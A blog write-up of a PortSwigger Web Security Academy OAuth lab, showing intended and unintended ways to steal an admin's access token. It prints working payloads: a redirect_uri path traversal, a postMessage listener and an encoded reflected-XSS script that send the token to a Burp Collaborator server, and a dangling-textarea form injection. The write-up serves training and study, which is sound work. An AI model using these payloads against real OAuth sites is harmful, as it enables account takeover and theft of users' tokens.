---
title: "Web Security Academy : Going deep on OAuth labs and a beautiful unintended solution"
date: "2020-12-20T07:50:45.000Z"
lastmod: "2020-12-20T15:54:49.000Z"
tags: ["web security"]
images: ["/content/images/2020/12/writeup25.png"]
slug: "web-security-academy-going-deep-on-oauth-labs-and-a-beautiful-unintended-solution"
url: "/web-security-academy-going-deep-on-oauth-labs-and-a-beautiful-unintended-solution/"
---
PortSwigger provides some labs that is constantly updated and I like to use it to improve my web hacking skills.

Recently they released a whole new set of labs on OAuth Authentication, I solved each one, learned new things, and ended up with a interesting unintended solution for the "Expert" lab that I want to share back to the community.

![](/content/images/2020/12/writeup0.png)

This lab is a simple blogging system that allows users to login with their social network.

![](/content/images/2020/12/writeup1.png)

The admin will open every link you send. So we need to craft a `one-click account takeover exploit` to access the admin `API key`.

## The intended solution

After analyzing the social media authentication request you will notice a `redirect_uri` parameter pointing to the `oauth callback URL`. This is where the system will redirect after confirming the authentication and it will append the current session `access_token` as `URL fragment` on client-side browser.

```
https://ac651fc21edf6692801b01df027000b8.web-security-academy.net/auth?client_id=h5hsc2015lpfl11rdst2n&redirect_uri=https://acba1f7e1eac66838035014900ce0059.web-security-academy.net/oauth-callback&response_type=token&nonce=2022103900&scope=openid%20profile%20email
```

![](/content/images/2020/12/writeup2.png)

In some cases you can directly change the `redirect_uri` pointing to your own server leaking the `access_token`.

```
https://ac651fc21edf6692801b01df027000b8.web-security-academy.net/auth?client_id=h5hsc2015lpfl11rdst2n&redirect_uri=https://YOUR-SERVER-HERE/oauth-callback&response_type=token&nonce=2022103900&scope=openid%20profile%20email
```

But not in this case..

![](/content/images/2020/12/writeup3.png)

There's a whitelist of `redirect_uris` and the URL must include the substring:

```
https://acba1f7e1eac66838035014900ce0059.web-security-academy.net/oauth-callback
```

### Path traversal

The whitelist forces the redirection to be fixed on this `host`, but not on this `path`, because this whitelist is vulnerable to a `Path Traversal`.

```
https://acba1f7e1eac66838035014900ce0059.web-security-academy.net/oauth-callback/../OTHERPATH

Will be interpreted as:

https://acba1f7e1eac66838035014900ce0059.web-security-academy.net/OTHERPATH
```

Knowing this, we can redirect the callback to `everywhere` on this host, but where we can redirect to leak their `access_token`?

### Insecure web messaging scripts

After a enumeration I found some `insecure web messaging scripts` that create a `Post Message` with the `data="window.location.href"` when the page loads pointing to a `parent listener` trusting on `*`.

![](/content/images/2020/12/writeup7.png)
Parent Post Message trigger trusting on *

![](/content/images/2020/12/writeup5.png)
Following the Post Message content, triggered on page load.

![](/content/images/2020/12/writeup6.png)
Post message Event Listener on a comment box.

> This is a perfect gadget to us, because `window.location.href` includes the `URL fragment` and the post message will propagate to `every parent listener`.

So, the main idea is:

- Create a malicious web page w/ our `own listener` redirecting the `event data` to a external server;
- Include a `IFRAME` to load the Callback redirecting to a Path Traversal `/oauth-callback/../post/comment/comment-form` where the post message trigger are stored;
- The post message will be sent to `our parent listener` and the listener will dump the `event data` to our external server using a JS `location redir`.

### My final payload

The expected payload to solve this lab.

```
<script>  
window.addEventListener('message', function(e){  
  var myJSON = JSON.stringify(e.data); 
  location="https://xjk4v64ui2yq425467i1tz766xcn0c.burpcollaborator.net/?x="+encodeURIComponent(myJSON);
    });
</script> 

<iframe id="aaaa" src="https://ac6d1f1f1e9462a380ec24ee02f500e3.web-security-academy.net/auth?client_id=pfx6adz3dqzlgebroh99o&redirect_uri=https://acd01fa21eb0624f806f2427008a0072.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1679470272&scope=openid%20profile%20email" onload="this.contentWindow.postMessage('intrd'),'*')">
```

Hosting this on a malicious web page and sending to user will leak the `access_token`.

![](/content/images/2020/12/writeup10.png)

And finally with this `Bearer` session token we can `authenticate as admin`, extract their `APIKEY`.

![](/content/images/2020/12/writeup9.png)

And submit the solution.

![](/content/images/2020/12/writeup11.png)

## The unintended solution

Well, the original solution depends on this Web Message scripts.

> What if there's no Web Message scripts?

So, If you enumerate this `OpenID` authentication server a little more you will find the `OpenID Connect` configuration values from the provider's `Well-Known Configuration Endpoint`, per the specification (<http://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfigurationRequest>).

> The `/.well-known/openid-configuration` will leak all OpenID endpoints and accepted parameters.

![](/content/images/2020/12/writeup12.png)

As we know, the default `response_mode` is `fragment`, its not included on the request but you can add the parameter and get the normal redirect callback+fragments response.

![](/content/images/2020/12/writeup13.png)

Now following this OpenID configuration I noticed that we are also allowed to set `form_post`,`fragment` and `query` modes.

And the `form_post` mode will return a HTML page with a `auto-submit form` that includes a `hidden access_token input`.

![](/content/images/2020/12/writeup14.png)

You can also change the `response_type` to `id_token token`, it will return a full `JWT token`, useful in some cases.

![](/content/images/2020/12/writeup15.png)

### HTML Injection

The same way this endpoint are vulnerable to `Path Traversal`, it is also vulnerable to `HTML Injection`.

> I noticed that you can break the `">` and reflect everything the callback response page, there's no filtering.

With the following payload you are able to trigger a perfect `reflected XSS`, and it will be processed before the callback `auto-form post`.

```
https://ac781f131e7fc6b480b0008402df0010.web-security-academy.net/auth?client_id=j12euxwsilq7h2ify5qop&redirect_uri=https://ac621fda1e74c65080fa0017006500e8.web-security-academy.net/oauth-callback"><script>alert(0)</script><x="&response_type=token&nonce=-752270522&scope=openid%20profile%20email&response_mode=form_post
```

![](/content/images/2020/12/writeup16.png)

![](/content/images/2020/12/writeup17.png)

> Now we have a `XSS` executed directly on a page containing the `access_token`.

We just need to find a way to dump this page content to a external server.

### Trying to redirect the document.body.innerHTML to a external server

This is the most simple way to read a page content from a XSS bypassing CORS, and the first thing to came in my mind.

```
https://acdd1f011f7a275781d61e6c02b8005e.web-security-academy.net/auth?client_id=wt8e823bklnuhof8cekfj&redirect_uri=https://ac7b1fca1f9e271c81e31e7e00c30051.web-security-academy.net/oauth-callback/%22%3e%3c%73%63%72%69%70%74%3e%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%61%76%39%68%37%6a%67%37%75%66%61%33%67%66%68%68%69%6b%75%65%35%63%6a%6a%69%61%6f%31%63%71%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%78%3d%22%2b%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%29%3c%2f%73%63%72%69%70%74%3e%3c%78%3d%22%26%72%65%73%70%6f%6e%73%65%5f%74%79%70%65%3d%74%6f%6b%65%6e&nonce=381190702&scope=openid%20profile%20email&response_mode=form_post
```

![](/content/images/2020/12/writeup19.png)

The redirection works, the XSS read the `document.body.innerHTML` URIencode and send to a external server as a parameter.

![](/content/images/2020/12/writeup18.png)

But because the `synchronous nature of Javascript` the page content breaks on the exact point that script is executed closing the `</form>` and ignoring the rest of the page, also ignoring the `access_token` input value.

### Taking advantage of callback auto-submit form to submit a dangling form input as a new comment

This one was cool, the main idea is:

- Use this `auto-submit form` generated by `OpenID callback` pointing to a Path traversal `/oauth-callback/../post/comment`
- This will submit a new comment on the blog comment box
- And I will use a `dangling <textarea>` to read the rest of the page, including the `access_token input` and set it as `comment` input value.

```
https://acdd1f011f7a275781d61e6c02b8005e.web-security-academy.net/auth?client_id=wt8e823bklnuhof8cekfj&redirect_uri=https://ac7b1fca1f9e271c81e31e7e00c30051.web-security-academy.net/oauth-callback/../post/comment"><input+type%3d"hidden"+name%3d"csrf"+value%3d"krmJUkwDpNZFBqhiFEDpP25A9Ql6uAKg"><input+type%3d"hidden"+name%3d"name"+value%3d"aaaaaa"><input+type%3d"hidden"+name%3d"email"+value%3d"aaaaaa@sads.com"><input+type%3d"hidden"+name%3d"website"+value%3d"http://asdsd"><input+type%3d"hidden"+name%3d"postId"+value%3d"1"><textarea+id%3d"hidden"+name%3d"comment"+rows%3d"4"+cols%3d"50">&response_type=token&nonce=381190702&scope=openid%20profile%20email&response_mode=form_post
```

Pay attention on that dangling `<textarea>` that never closes, this will send the rest of the form as `comment` parameter.

Crazy idea?

![](/content/images/2020/12/writeup20.png)

It works like a charm, commented the victim `access_token`.

![](/content/images/2020/12/writeup22.png)

But there's a problem here, our payload has a `hardcoded CSRF token` and the victim session(admin) will have a different `CSRF token`, so we need to leak this `CSRF token` first and then do the post.

This sounds possible, but i've found a better way.

### Asynchronous fetching the entire callback page

We already are controlling the client-side browsing why not force the client to do `another callback redirect` and then fetch the full response using `JavaScript Fetch API`?

```
"><script>

const url = 'https://acdd1f011f7a275781d61e6c02b8005e.web-security-academy.net/auth?client_id=wt8e823bklnuhof8cekfj&redirect_uri=https://ac7b1fca1f9e271c81e31e7e00c30051.web-security-academy.net/oauth-callback&response_type=token&nonce=381190702&scope=openid%20profile%20email&response_mode=form_post';  
const intrd_collab = 'https://n6uuiwrk5slgrssutx5rgpuwtnzgn5.burpcollaborator.net';

const request = async () => {  
    const response = await fetch(url);
    const dump = await response.text();
    new Image().src=intrd_collab+'/?dump='+encodeURIComponent(dump);
}
request();

</script><input "hidden" name="xxx" value="
```

The idea here is:

- Change the OpenID `response_mode` to `form_post`, returning a auto-submit callback page;
- Use the `XSS` to execute a `async fetch JS` to the response;
- This will do a `new GET request` to the callback and stores the full response into a variable;
- URIencode this variable as a parameter and create a `new Image()` that point the `src` to a external server.

This way you can read the entire callback page content and the `new Image()` trick will `bypass the CORS`.

### Final Payload (unintended way)

Putting all the things together.

```
<script>  
location="https://acdd1f011f7a275781d61e6c02b8005e.web-security-academy.net/auth?client_id=wt8e823bklnuhof8cekfj&redirect_uri=https://ac7b1fca1f9e271c81e31e7e00c30051.web-security-academy.net/oauth-callback%22%3e%3c%73%63%72%69%70%74%3e%0d%0a%0d%0a%63%6f%6e%73%74%20%75%72%6c%20%3d%20%27%68%74%74%70%73%3a%2f%2f%61%63%64%64%31%66%30%31%31%66%37%61%32%37%35%37%38%31%64%36%31%65%36%63%30%32%62%38%30%30%35%65%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%75%74%68%3f%63%6c%69%65%6e%74%5f%69%64%3d%77%74%38%65%38%32%33%62%6b%6c%6e%75%68%6f%66%38%63%65%6b%66%6a%26%72%65%64%69%72%65%63%74%5f%75%72%69%3d%68%74%74%70%73%3a%2f%2f%61%63%37%62%31%66%63%61%31%66%39%65%32%37%31%63%38%31%65%33%31%65%37%65%30%30%63%33%30%30%35%31%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%6f%61%75%74%68%2d%63%61%6c%6c%62%61%63%6b%26%72%65%73%70%6f%6e%73%65%5f%74%79%70%65%3d%74%6f%6b%65%6e%26%6e%6f%6e%63%65%3d%33%38%31%31%39%30%37%30%32%26%73%63%6f%70%65%3d%6f%70%65%6e%69%64%25%32%30%70%72%6f%66%69%6c%65%25%32%30%65%6d%61%69%6c%26%72%65%73%70%6f%6e%73%65%5f%6d%6f%64%65%3d%66%6f%72%6d%5f%70%6f%73%74%27%3b%0d%0a%63%6f%6e%73%74%20%69%6e%74%72%64%5f%63%6f%6c%6c%61%62%20%3d%20%27%68%74%74%70%73%3a%2f%2f%6e%36%75%75%69%77%72%6b%35%73%6c%67%72%73%73%75%74%78%35%72%67%70%75%77%74%6e%7a%67%6e%35%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%27%3b%0d%0a%0d%0a%63%6f%6e%73%74%20%72%65%71%75%65%73%74%20%3d%20%61%73%79%6e%63%20%28%29%20%3d%3e%20%7b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%72%65%73%70%6f%6e%73%65%20%3d%20%61%77%61%69%74%20%66%65%74%63%68%28%75%72%6c%29%3b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%64%75%6d%70%20%3d%20%61%77%61%69%74%20%72%65%73%70%6f%6e%73%65%2e%74%65%78%74%28%29%3b%0d%0a%20%20%20%20%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%3d%69%6e%74%72%64%5f%63%6f%6c%6c%61%62%2b%27%2f%3f%64%75%6d%70%3d%27%2b%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%64%75%6d%70%29%3b%0d%0a%7d%0d%0a%72%65%71%75%65%73%74%28%29%3b%0d%0a%0d%0a%3c%2f%73%63%72%69%70%74%3e%3c%69%6e%70%75%74%20%22%68%69%64%64%65%6e%22%20%6e%61%6d%65%3d%22%78%78%78%22%20%76%61%6c%75%65%3d%22&response_type=token&nonce=381190702&scope=openid%20profile%20email&response_mode=form_post";  
</script>
```

When the authenticated victim clicks on the malicious link..

The entire callback page including the `access_token` will be leaked to our controlled server as a encoded parameter.

![](/content/images/2020/12/writeup23.png)

And we can use the session token to retrieve the API token. `:)`

![](/content/images/2020/12/writeup24.png)

# Bonus: Another XSS

The blog post endpoint `/post?postId=9&uly0j'><script>alert(1)</script>aaaa=1` will also works to trigger the XSS and I believe that it can be used to find another ways to leak the `access_token`.

## References

- Stealing OAuth access tokens via a proxy page (Lab) - <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page>
- PostMessage-tracker by Frans Rosén - <https://github.com/fransr/postMessage-tracker>
- OpenID Connect Discovery 1.0 incorporating errata set 1 - <https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfigurationRequest>
- OAuth 2.0 authentication vulnerabilities - <https://portswigger.net/web-security/oauth>
- OpenID Connect vulnerabilities - <https://portswigger.net/web-security/oauth/openid#openid-connect-vulnerabilities>
- The Fetch API - <https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API>
